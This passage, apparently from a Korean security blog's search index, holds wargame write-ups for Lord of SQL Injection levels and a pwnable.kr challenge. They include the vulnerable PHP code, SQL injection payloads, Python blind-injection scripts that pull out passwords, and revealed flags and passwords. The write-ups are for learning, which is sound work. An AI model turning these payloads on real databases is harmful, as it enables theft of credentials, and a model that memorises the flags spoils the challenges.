solve(\"frankenstein\");  highlight_file(__FILE__);?&gt;FRANKENSTEIN Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/09/14/los-frankenstein.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-09-09-los-blue-dragon-html": {
        "title": "[Lord of SQL Injection] LoS - blue_dragon 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "September 9, 2018",
        "author": "",
        "category": "",
        "content": "드디어 용 시리즈의 마지막인 blue_dragon이다.내가 바보임을 다시 한 번 깨달을 수 있었던 문제였다.코드는 다음과 같다.--------------------------------------------------------------------------------------query : select id from prob_blue_dragon where id='' and pw=''--------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\./i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\./i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if(preg_match('/\\'|\\\\\\/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/\\'|\\\\\\/i', $_GET[pw])) exit(\"No Hack ~_~\");  if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";  $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"blue_dragon\");  highlight_file(__FILE__);?&gt;단순히 필터링만 보자면 '(싱글쿼터)와 여태까지 싱글쿼터가 필터링이었을 때 사용했던 \\을 사용하지 못하도록 되어 있다.그런데 필터링을 걸어 둔 위치가 좀 다르다.쿼리를 실행시킨 후에 필터링을 검사하고 이에 대한 결과를 출력한다.그래서 '를 사용한다면 쿼리의 결과를 Hello admin의 형태로는 확인할 수 없겠지만, 어찌됬든 쿼리가 실행은 되므로 Time Based Blind SQL Injection을 사용할 수 있다.테스트로 id=a&amp;pw=' or id='admin' and if(length(pw)&gt;0, sleep(3), 0)#을 입력 해 보았다.그랬더니 약 3초 간 지연 후에 내가 입력 한 쿼리와 함께 No Hack ~_~을 출력하는 결과 화면을 볼 수 있었다.정상적으로 쿼리가 동작하므로 pw의 길이와 값을 알아내기 위해 아래와 같이 코드를 구현했다.import urllib2import urllibimport requestsimport timeflag = \"\"length = 0url = \"http://los.rubiya.kr/blue_dragon_23f2e3c81dca66e496c7de2d63b82984.php?id=a&amp;pw=' or id='admin' and\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find length of the password\"for i in range(0, 40):\ttry:\t\tstart = time.time()\t\tquery = url + \" if(length(pw) = \" + str(i) + \", sleep(3), 0)%23\"\t\tr = requests.post(query, cookies=session)\texcept:\t\tprint \"[-] Error occur\"\t\tcontinue\tif (time.time() - start) &gt; 3:\t\tlength = i\t\tbreak\tprint \"[+] Found length : \", lengthprint \"[+] Find password\"\tfor j in range(1, length + 1):\tfor i in range(48, 123):\t\ttry:\t\t\tstart = time.time()\t\t\tquery = url + \" if(substr(pw, \" + str(j) + \", 1) = \" + hex(i) + \", sleep(3), 0)%23\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif (time.time() - start) &gt; 3:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"내 서버가 너무 느려서 도대체 결과가 안나오길래 쿼리가 잘못된 것인가 고민했었다.그런데 학교 다닐 때 쓰던 동아리 서버에서 돌렸더니 너무 잘돌아간다 ㅎㅎ서버를 바꾸던가 해야지 원…어찌됬건 결과는 다음과 같다.$ python ex.py [+] Start[+] Find length of the password[+] Found length :  8[+] Find password[+] Found 1 : D[+] Found 2 : D9[+] Found 3 : D94[+] Found 4 : D948[+] Found 5 : D948B[+] Found 6 : D948B8[+] Found 7 : D948B8A[+] Found 8 : D948B8A0[+] Found password :  D948B8A0[+] End역시나 소문자로 입력 해 주면 문제를 풀 수 있다.?pw=d948b8a0---------------------------------------------------------------------------------------------------query : select id from prob_blue_dragon where id='' and pw='d948b8a0'---------------------------------------------------------------------------------------------------BLUE_DRAGON Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\./i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\./i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_blue_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if(preg_match('/\\'|\\\\\\/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/\\'|\\\\\\/i', $_GET[pw])) exit(\"No Hack ~_~\");  if($result['id']) echo \"&lt;h2&gt;Hello {$result[id]}&lt;/h2&gt;\";  $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_blue_dragon where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"blue_dragon\");  highlight_file(__FILE__);?&gt;BLUE_DRAGON Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/09/09/los-blue_dragon.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-09-08-los-red-dragon-html": {
        "title": "[Lord of SQL Injection] LoS - red_dragon 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "September 8, 2018",
        "author": "",
        "category": "",
        "content": "정신 차려보니 green_dragon 문제를 푼지 벌써 2주가 지나있다.그동안 휴가도 다녀오고 휴가를 다녀오느라 못한 일들을 하느라 정신이 없었다.red_dragon을 오랜만에 풀어보았는데 좀 어려웠다 ㅠㅠ코드는 다음과 같다.------------------------------------------------------------------------------------query : select id from prob_red_dragon where id='' and no=1------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\./i', $_GET['id'])) exit(\"No Hack ~_~\");  if(strlen($_GET['id']) &gt; 7) exit(\"too long string\");  $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;  $query = \"select id from prob_red_dragon where id='{$_GET[id]}' and no={$no}\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_red_dragon where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] === $_GET['pw'])) solve(\"red_dragon\");  highlight_file(__FILE__);?&gt;이번엔 id와 no를 입력 받는다.그런데 id는 7글자를 넘을 수 없고, no에는 순전히 숫자만 들어갈 수 있다.그래서 처음에는 id가 admin인 행의 no를 찾아보자!라고 생각했는데, no가 아무래도 작은 수는 아닌가보다.그리고 문제를 풀려면 정확한 pw의 값이 필요한데, 이 방법으로는 그걸 알아낼 수도 없다.한참을 고민했는데 모르겠어서 주변의 웹잘알님께 물어보았다.그랬더니 아래와 같은 방법을 알려주었다.?id='||pw&gt;%23&amp;no=%0a0x61이렇게 입력하면 완성되는 쿼리는 다음과 같다.select id from prob_red_dragon where id=''||pw&gt;#' and no=0x61no= 다음에 %0a를 입력했기 때문에 뒤의 0x61은 다음 줄에 들어간다.#은 MySQL에서 한 줄 주석 문자이며, MySQL에서는 여러 줄에 걸쳐 쿼리를 입력할 수 있다.그래서 위의 쿼리문에서 주석처리되는 부분과 개행을 빼고 깔끔하게 정리하면 아래와 같이 된다.select id from prob_red_dragon where id=''||pw&gt;0x61헤…이러면 한 글자 씩 pw를 비교할 수 있다!아래는 내 서버에서 테스트 해 본 결과이다.mysql&gt; select * from user where id='admin' and pw&gt;0x61;+---------+----------+| id      | pw       |+---------+----------+| admin   | asdawqwe |+---------+----------+1 row in set (0.00 sec)mysql&gt; select * from user where id='admin' and pw&gt;0x62;Empty set (0.00 sec)mysql&gt; select * from user where id='admin' and pw&gt;0x6172;+---------+----------+| id      | pw       |+---------+----------+| admin   | asdawqwe |+---------+----------+1 row in set (0.00 sec)mysql&gt; select * from user where id='admin' and pw&gt;0x6173;+---------+----------+| id      | pw       |+---------+----------+| admin   | asdawqwe |+---------+----------+1 row in set (0.01 sec)mysql&gt; select * from user where id='admin' and pw&gt;0x6174;Empty set (0.00 sec)위와 같이 pw를 한 글자 씩 비교할 수 있는데, =이 아닌 &gt;를 통해 비교하고 있기 때문에 결과값이 나오지 않는 순간의 직전 값이 pw의 정확한 값이 된다.따라서 문제에서 pw의 값을 hex 값으로 비교를 하다가 Hello admin이 안나온다면 그 값에서 -1을 한 값이 pw가 된다.그런데 마지막 글자를 찾을 때는 다르다.mysql&gt; select * from user where id='admin' and pw&gt;0x6173646177717764;+---------+----------+| id      | pw       |+---------+----------+| admin   | asdawqwe |+---------+----------+1 row in set (0.00 sec)mysql&gt; select * from user where id='admin' and pw&gt;0x6173646177717765;Empty set (0.00 sec)위의 예시에서도 알 수 있듯이 마지막 글자는 Hello admin이 나오지 않은 값이 정확한 pw의 값이다.이를 바탕으로 아래와 같이 코드를 구현했다.import urllib2import urllibimport requestsflag = \"0x\"url = \"http://los.rubiya.kr/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find password\"for j in range(1, 20):\tfound = False\tfor i in range(48, 128):\t\ttry:\t\t\tquery = url + \"'||pw&gt;%23&amp;no=%0a\" + flag + hex(i)[2:]\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif 'Hello admin' not in r.text:\t\t\tflag += str(hex(i - 1))[2:]\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tfound = True\t\t\tbreak\tif not found:\t\tprint \"[+] Found password finished\"\t\tbreak\tflag = flag[2:].decode(\"hex\")flag = flag[:-1] + chr(ord(flag[-1]) + 1)print \"[+] Found password : \", flagprint \"[+] End\"pw의 길이를 모르기 때문에 일단 20까지 반복문을 돌렸다.그리고 마지막 글자는 Hello admin이 나오지 않은 그 순간의 값이기 때문에 다시 +1을 해 출력 해 주었다.그 결과 다음과 같았다.$ python ex.py [+] Start[+] Find password[+] Found 1 : 0x41[+] Found 2 : 0x4135[+] Found 3 : 0x413533[+] Found 4 : 0x41353344[+] Found 5 : 0x4135334444[+] Found 6 : 0x413533444434[+] Found 7 : 0x41353344443436[+] Found 8 : 0x4135334444343640[+] Found password finished[+] Found password :  A53DD46A[+] End이 전의 문제에서도 pw의 값은 소문자였기 때문에 이번에도 아래와 같이 소문자로 입력 해 주었다.?pw=a53dd46a그 결과 문제를 풀 수 있었다.----------------------------------------------------------------------------------query : select id from prob_red_dragon where id='' and no=1----------------------------------------------------------------------------------RED_DRAGON Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\./i', $_GET['id'])) exit(\"No Hack ~_~\");  if(strlen($_GET['id']) &gt; 7) exit(\"too long string\");  $no = is_numeric($_GET['no']) ? $_GET['no'] : 1;  $query = \"select id from prob_red_dragon where id='{$_GET[id]}' and no={$no}\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;/h2&gt;\";  $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_red_dragon where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysql_fetch_array(mysql_query($query));  if(($result['pw']) &amp;&amp; ($result['pw'] === $_GET['pw'])) solve(\"red_dragon\");  highlight_file(__FILE__);?&gt;RED_DRAGON Clear!!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/09/08/los-red_dragon.html"
      }
      ,
    
      "wargame-pwnable-kr-2018-08-25-pwnable-kr-blukat-html": {
        "title": "[Pwnable.kr] Toddler's Bottle - blukat 문제풀이",
        "tags": "Write-up, Pwnable.kr",
        "date": "August 25, 2018",
        "author": "",
        "category": "",
        "content": "요즘에 계속 los만 풀고 있었는데, 주변에서 갑자기 pwnable.kr에 새로운 문제가 추가됬다며 꼭 풀어보라고 자꾸 추천해줬다.문제를 풀어 본 사람들이 다 재미있는 문제라고 하길래 한번 풀어보게 되었다.문제 접속 정보는 아래와 같다.  ssh blukat@pwnable.kr -p2222 (pw: guest)문제에 접속하면 4개의 파일을 확인할 수 있다.  -r-xr-sr-x  1 root blukat_pwn 9144 Aug  8 06:44 blukat-rw-r–r–  1 root root        645 Aug  8 06:43 blukat.c-rw-r—–  1 root blukat_pwn   33 Jan  6  2017 password바이너리가 있고, 소스코드와 password 파일이 있다.일단 소스코들 확인 해 보았다.#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;char flag[100];char password[100];char* key = \"3\\rG[S/%\\x1c\\x1d#0?\\rIS\\x0f\\x1c\\x1d\\x18;,4\\x1b\\x00\\x1bp;5\\x0b\\x1b\\x08\\x45+\";void calc_flag(char* s){\tint i;\tfor(i=0; i&lt;strlen(s); i++){\t\tflag[i] = s[i] ^ key[i];\t}\tprintf(\"%s\\n\", flag);}int main(){\tFILE* fp = fopen(\"/home/blukat/password\", \"r\");\tfgets(password, 100, fp);\tchar buf[100];\tprintf(\"guess the password!\\n\");\tfgets(buf, 128, stdin);\tif(!strcmp(password, buf)){\t\tprintf(\"congrats! here is your flag: \");\t\tcalc_flag(password);\t}\telse{\t\tprintf(\"wrong guess!\\n\");\t\texit(0);\t}\treturn 0;}main 함수에서 password 파일을 읽고, 사용자에게 입력 값을 받는다.만약 이 입력값과 password 내의 값이 같다면 calc_flag(password) 함수를 통해 flag를 출력 해 준다.혹시 몰라 cat 명령어를 통해 읽었더니 아래와 같이 출력됬다.blukat@ubuntu:~$ cat password cat: password: Permission denied그래서 무슨 방법이 있을까 고민하다가 그냥 아래처럼 입력했더니 문제가 갑자기 풀렸다.blukat@ubuntu:~$ cat password | ./blukat guess the password!congrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!???flag의 내용이 뭔가 이상해서 id 명령어로 권한을 확인 해 보았다.blukat@ubuntu:~$ iduid=1104(blukat) gid=1104(blukat) groups=1104(blukat),1105(blukat_pwn)그랬더니 그룹 권한이 부여된 것을 알 수 있었다.그런데 cat password를 하면 계속 Permission denied가 나며 읽을 수 없다고 했다.그룹 권한이 주어졌다면 읽을 수 있어야 하는게 맞는데 뭔가 이상해서 다른 방법으로 password의 내용을 읽어 보았다.blukat@ubuntu:~$ hd password 00000000  63 61 74 3a 20 70 61 73  73 77 6f 72 64 3a 20 50  |cat: password: P|00000010  65 72 6d 69 73 73 69 6f  6e 20 64 65 6e 69 65 64  |ermission denied|00000020  0a                                                |.|00000021ㅂㄷㅂㄷ그랬더니 cat: password: Permission denied 자체가 password의 내용이라는 것을 알 수 있었다.낚임…ㅋㅋㅋㅋㅋ다시 blukat을 실행해서 위의 내용을 입력 했더니 문제가 정상적으로 풀렸다.blukat@ubuntu:~$ ./blukat guess the password!cat: password: Permission deniedcongrats! here is your flag: Pl3as_DonT_Miss_youR_GrouP_Perm!!FLAG : Pl3as_DonT_Miss_youR_GrouP_Perm!!",
        "url": "//wargame/pwnable.kr/2018/08/25/pwnable.kr-blukat.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-25-los-green-dragon-html": {
        "title": "[Lord of SQL Injection] LoS - green_dragon 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 25, 2018",
        "author": "",
        "category": "",
        "content": "다시  los.rubiya.kr의 서버로 돌아와서 다음 문제를 풀어보았다.드디어 dragon 시리즈의 시작이다.코드는 다음과 같다.------------------------------------------------------------------------------------------query : select id,pw from prob_green_dragon where id='' and pw=''------------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\'|\\\"/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\'|\\\"/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id']){    if(preg_match('/prob|_|\\.|\\'|\\\"/i', $result['id'])) exit(\"No Hack ~_~\");    if(preg_match('/prob|_|\\.|\\'|\\\"/i', $result['pw'])) exit(\"No Hack ~_~\");    $query2 = \"select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'\";    echo \"&lt;hr&gt;query2 : &lt;strong&gt;{$query2}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";    $result = mysql_fetch_array(mysql_query($query2));    if($result['id'] == \"admin\") solve(\"green_dragon\");  }  highlight_file(__FILE__);?&gt;소스코드가 좀 길어졌다.쿼리가 2개가 있는데, 첫 번째 쿼리는 내가 입력한 id와 pw를 가지고 prob_green_dragon 테이블에서 값을 뽑아온다.그런데 이 후, 해당 테이블에서 추출 한 id와 pw를 가지고 다시 필터링을 거친 후에, 결과로 나왔던 그 id와 pw를 가지고 한번 더 쿼리를 수행한다.그래서 나온 결과값의 id의 값이 admin이라면 문제를 풀 수 있다.필터링에 '(싱글쿼터)가 있기 때문에 먼저 이를 우회해야 한다.이 전 문제에서 이와 유사한 문제가 있었기 때문에 아래와 같이 입력 해 필터링 우회를 시도 해 보았다.?id=\\&amp;pw= or id=0x61646d696e#이를 입력하면 완성되는 쿼리는 아래와 같다.select id,pw from prob_green_dragon where id='\\' and pw=' or id=0x61646d696e#'때문에 id가 \\'and pw이거나 id가 0x61646d696e인 값을 데이터베이스에서 찾아 추출하게 된다.그런데 아무리 해도 결과 값이 나오지 않았다.처음엔 내가 문제를 잘못푼 줄 알았는데, 다시 생각해보니 $query2의 존재가 의심스러웠다.만약에 내가 했던 방법으로 문제가 풀릴 거라면, $query에서 나온 결과값이 바로 데이터베이스에 저장되어 있던 id와 pw의 값이기 때문에 이에 대해 따로 필터링을 할 필요가 없을 것 같았다.또한 그 id와 pw로 다시 한 번 select를 하는 것은 무의미해 보였다.그러다보니 이 테이블이 비어있다고 생각하게 되었다.테이블에 아무런 값이 없으니 아무리 조건을 넣어도 추출 할 값이 없었던 것이다.그래서 두 쿼리를 거친 결과가 select 'admin'이 되면 문제를 풀 수 있을 것이라고 생각했다.일단 $query2를 출력시키기 위해 id에는 \\를, pw에는 union select 1, 2%23를 입력 해 보았다.?id=\\&amp;pw=union select 1, 2%23그 결과 아래와 같이 두 번째 쿼리가 출력되는 것을 확인할 수 있었다.----------------------------------------------------------------------------------------------------------------query : select id,pw from prob_green_dragon where id='\\' and pw='union select 1,2#'---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------query2 : select id from prob_green_dragon where id='1' and pw='2'-----------------------------------------------------------------------------------------&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\'|\\\"/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\'|\\\"/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id']){    if(preg_match('/prob|_|\\.|\\'|\\\"/i', $result['id'])) exit(\"No Hack ~_~\");    if(preg_match('/prob|_|\\.|\\'|\\\"/i', $result['pw'])) exit(\"No Hack ~_~\");    $query2 = \"select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'\";    echo \"&lt;hr&gt;query2 : &lt;strong&gt;{$query2}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";    $result = mysql_fetch_array(mysql_query($query2));    if($result['id'] == \"admin\") solve(\"green_dragon\");  }  highlight_file(__FILE__);?&gt;예상대로 두 번째 쿼리에 1과 2가 들어갔다.그럼 이제 union select 1, 2 자리에 적당한 값을 넣어서 두 번째 쿼리가 select admin을 하도록 만들면 될 것 같다.그런데 $result['id']와 $result['pw']에 대해서도 같은 필터링이 걸려 있으므로 문자열은 사용할 수가 없고, 싱글쿼터를 우회해야 한다.그래서 두 번째 쿼리의 id 값에는 \\가 들어가야 한다는 것을 쉽게 알 수 있다.이 때, \\는 문자이기 때문에 union select \\, 2 형태로 넣을 수 없기 때문에 \\ 또한 hex 값으로 바꾸어 넣어주어야 한다.문제는 $result['pw'] 자리에 들어갈 내용이다.내가 만들고 싶은 두 번째 쿼리의 형태는 다음과 같다.select id from prob_green_dragon where id='\\' and pw='union select 0x61646d696e#그러면 뒤의 union select 0x61646d696e가 되어, 최종적으로 admin을 추출할 수 있게 된다.그런데 문제는 첫 번째 쿼리에서 뭐라고 입력해야 두 번째 쿼리에 내가 원하는 값을 넣을 수 있느냐는 것이었다.서버에서 테스트를 해 보았는데, 아래와 같이 입력하니 결과값을 얻을 수 있었다.mysql&gt; select id, pw from user where id='\\' and pw=' union select 1, (select 2);+----+----+| id | pw |+----+----+| 1  | 2  |+----+----+1 row in set (0.01 sec)이를 그대로 넣으면, 두 번째 쿼리의 pw 자리에 2가 들어간다.그렇다면 2를 적절히 수정해서 union select 0x61646d696e를 만들면 된다.그런데 앞에서 말했다시피 싱글쿼터와 더블쿼터가 필터링 되어 있기 때문에 hex로 변경 해서 값을 넣어주어야 한다.union select 0x61646d696e를 하나하나 hex 값으로 바꾸면 0x756e696f6e2073656c6563742030783631363436643639366523이 된다.이 값을 아래와 같이 쿼리스트링으로 넘겨주었다.?id=\\&amp;pw= union select 0x5c, (select 0x756e696f6e2073656c6563742030783631363436643639366523)%23역시 내 예상과 맞게 문제를 풀 수 있었다.-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------query : select id,pw from prob_green_dragon where id='\\' and pw=' union select 0x5c, (select 0x756e696f6e2073656c6563742030783631363436643639366523)#'-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------query2 : select id from prob_green_dragon where id='\\' and pw='union select 0x61646d696e#'------------------------------------------------------------------------------------------------------------------------------GREEN_DRAGON Clear!&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  if(preg_match('/prob|_|\\.|\\'|\\\"/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\'|\\\"/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id,pw from prob_green_dragon where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysql_fetch_array(mysql_query($query));  if($result['id']){    if(preg_match('/prob|_|\\.|\\'|\\\"/i', $result['id'])) exit(\"No Hack ~_~\");    if(preg_match('/prob|_|\\.|\\'|\\\"/i', $result['pw'])) exit(\"No Hack ~_~\");    $query2 = \"select id from prob_green_dragon where id='{$result[id]}' and pw='{$result[pw]}'\";    echo \"&lt;hr&gt;query2 : &lt;strong&gt;{$query2}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";    $result = mysql_fetch_array(mysql_query($query2));    if($result['id'] == \"admin\") solve(\"green_dragon\");  }  highlight_file(__FILE__);?&gt;GREEN_DRAGON Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2018/08/25/los-green_dragon.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2018-08-24-los-umaru-html": {
        "title": "[Lord of SQL Injection : eagle-jump] LoS - umaru 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "August 24, 2018",
        "author": "",
        "category": "",
        "content": "내가 지금 문제를 풀고 있는 서버는 los.rubiya.kr인데, los.eagle-jump.ord에도 같은 문제가 있다.그런데 eagle-jump 서버의 마지막 문제는 rubiya의 서버에 없는 것 같아 따로 풀어보게 되었다.코드는 다음과 같다.&lt;?php  include \"./config.php\";  login_chk();  dbconnect();  function reset_flag(){    $new_flag = substr(md5(rand(10000000,99999999).\"qwer\".rand(10000000,99999999).\"asdf\".rand(10000000,99999999)),8,16);    $chk = @mysql_fetch_array(mysql_query(\"select id from prob_umaru where id='{$_SESSION[los_id]}'\"));    if(!$chk[id]) mysql_query(\"insert into prob_umaru values('{$_SESSION[los_id]}','{$new_flag}')\");    else mysql_query(\"update prob_umaru set flag='{$new_flag}' where id='{$_SESSION[los_id]}'\");    echo \"reset ok\";    highlight_file(__FILE__);    exit();  }  if(!$_GET[flag]){ highlight_file(__FILE__); exit; }  if(preg_match('/prob|_|\\./i', $_GET[flag])) exit(\"No Hack ~_~\");  if(preg_match('/id|where|order|limit|,/i', $_GET[flag])) exit(\"HeHe\");  if(strlen($_GET[flag])&gt;100) exit(\"HeHe\");  $realflag = @mysql_fetch_array(mysql_query(\"select flag from prob_umaru where id='{$_SESSION[los_id]}'\"));  @mysql_query(\"create temporary table prob_umaru_temp as select * from prob_umaru where id='{$_SESSION[los_id]}'\");  @mysql_query(\"update prob_umaru_temp set flag={$_GET[flag]}\");  $tempflag = @mysql_fetch_array(mysql_query(\"select flag from prob_umaru_temp\"));  if((!$realflag[flag]) || ($realflag[flag] != $tempflag[flag])) reset_flag();  if($realflag[flag] === $_GET[flag]) solve(\"umaru\");?&gt;뭔가 엄청 복잡 해 보인다.자세히 살펴보면, reset_flag() 라는 함수에서 $new_flag라는 변수를 생성한다.이 변수는 랜덤숫자+qwer+랜덤숫자+asdf를 md5로 해싱한 후 16글자만을 자른 값이다.그 후, 나의 los_id와 함께 테이블에 값을 저장한다.내가 넘길 수 있는 쿼리스트링은 flag 뿐이다.그런데 $_GET['flag']가 여러 곳에서 사용되는데, 내가 flag의 값을 넘겨주면, 몇 가지 필터링을 검사한 후 데이터베이스에 저장 된 나의 flag를 찾아 prob_umaru_temp 테이블에 저장한다.이 후, 이 테이블에 내가 입력 한 flag의 값을 임시로 새로 생성 한 테이블에 저장한다.그리고 원래 테이블에 저장되어 있던 flag의 값과, 임시 테이블에 저장되어 있는 flag의 값을 비교하는데, 만약 값이 다르거나 원래 테이블에 flag가 없다면 reset_flag() 함수를 실행시킨다.즉, flag를 맞추지 못하면 계속 랜덤 값으로 flag가 바뀐다. ㅠㅠ따라서 문제를 풀기 위해서는 다음과 같은 조건이 필요하다.      flag의 값은 100글자를 넘기지 말 것    flag가 갱신되지 않도록 update 쿼리문에서 에러를 발생시킬 것    ,를 사용할 수 없기 때문에 sleep 함수를 사용해 값을 찾을 것  일단 문제에서 해쉬값 중 16글자를 잘라 테이블에 저장하므로, flag의 길이는 16글자임을 알 수 있다.때문에 값만 찾아내면 된다.일단 위의 조건을 만족하는 쿼리를 찾기 위해 서버에서 이것저것 테스트 해 보았다.제일 먼저 찾은 쿼리는 다음과 같다.update prob_umaru_temp set flag=sleep(3 * (flag like 'a%')) + (select 1 union select 2)이러면 먼저 sleep() 함수 내에서 flag의 값이 a%와 같은지를 비교하고, 같다면 1이 되기 때문에 sleep(3*1)이 만들어 진다.즉, 3초 동안 sleep() 함수를 실행하게 된다.반면 다를 경우에는 flag like 'a%'가 0이 되어 sleep(3*0)이 만들어 지기 때문에 sleep() 함수를 실행하지 않는다.sleep() 함수를 실행한 후에는 +연산으로 연결 된 select 1 union select 2를 실행하는데, 이 전 문제들에서도 사용했다시피 해당 쿼리는 에러를 유발한다.때문에 결과적으로 완성되는 쿼리는 에러가 발생하기 때문에 update 문을 실행하지 않게 되고, prob_umaru_temp 테이블과 prob_umaru 테이블에 저장된 flag의 값은 일치하기 때문에 reset_flag() 함수를 실행하지 않는다.그래서 이를 바탕으로 코드를 구현해서 테스트 해 보았는데, 아무리 해도 결과가 나오지 않았다.내 서버에서는 잘 되는데, 문제 서버에서는 안되길래 뭔가 설정이 다르게 되어있나 싶어서 연산자를 이것저것으로 바꿔 보았다.그 결과 |를 쓰니 값을 추출할 수 있었다.구현한 코드는 아래와 같다.import urllib2import urllibimport requestsimport timeflag = \"\"length = 16url = \"https://los.eagle-jump.org/umaru_6f977f0504e56eeb72967f35eadbfdf5.php?flag=\"session = dict(PHPSESSID = \"YOUR SESSION ID\")print \"[+] Start\"print \"[+] Find password\"for j in range(1, length + 1):\tfor i in range(48, 123):\t\ttry:\t\t\tstart = time.time()\t\t\tquery = url + \"sleep(3 * (flag like '\" + str(flag) + str(chr(i)) +\"%')) | (select 1 union select 2)\"\t\t\tr = requests.post(query, cookies=session)\t\texcept:\t\t\tprint \"[-] Error occur\"\t\t\tcontinue\t\tif (time.time() - start) &gt; 3:\t\t\tflag += chr(i)\t\t\tprint \"[+] Found \" + str(j), \":\", flag\t\t\tbreakprint \"[+] Found password : \", flagprint \"[+] End\"이 코드를 돌리면 아래와 같은 결과를 얻을 수 